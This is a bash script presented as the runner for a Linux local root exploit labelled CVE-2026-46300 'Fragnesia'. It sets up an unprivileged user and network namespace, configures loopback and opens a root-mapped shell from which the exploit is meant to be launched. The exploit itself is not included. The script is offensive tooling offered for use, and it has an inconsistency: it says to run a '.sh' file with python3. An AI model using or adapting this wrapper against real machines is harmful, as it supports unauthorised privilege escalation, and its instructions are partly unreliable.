#!/bin/bash
# ================================================
# CVE-2026-46300 - Fragnesia Local Root Exploit
# Namespace Setup + Exploit Runner (Bash Version)
# ================================================

set -euo pipefail

echo "[+] CVE-2026-46300 Fragnesia Exploit Wrapper"

if [[ $EUID -eq 0 ]]; then
    echo "[!] You are already running as root. This script is meant for unprivileged users."
    exit 1
fi

# ====================== Namespace Setup ======================

echo "[+] Creating user + network namespace..."

unshare_cmd="unshare --user --map-root-user --net"

if ! command -v unshare &> /dev/null; then
    echo "[-] 'unshare' command not found. Install util-linux."
    exit 1
fi

# Start the exploit in a new namespace
$unshare_cmd bash -c '
    echo "[+] Inside user+net namespace (running as root)"

    # Setup loopback interface (required for some network exploits)
    ip link set lo up 2>/dev/null || true
    ip addr add 127.0.0.1/8 dev lo 2>/dev/null || true

    echo "[+] Network namespace ready"
    echo "========================================"
    echo "You are now ready to run the Fragnesia exploit."
    echo "Example:"
    echo "    python3 fragnesia.sh"
    echo "    ./fragnesia"
    echo "========================================"

    # Drop into interactive shell
    echo "[+] Starting interactive shell (type \"exit\" to quit)"
    PS1="(Fragnesia) \u@\h:\w# " bash
' 

echo "[+] Namespace session ended."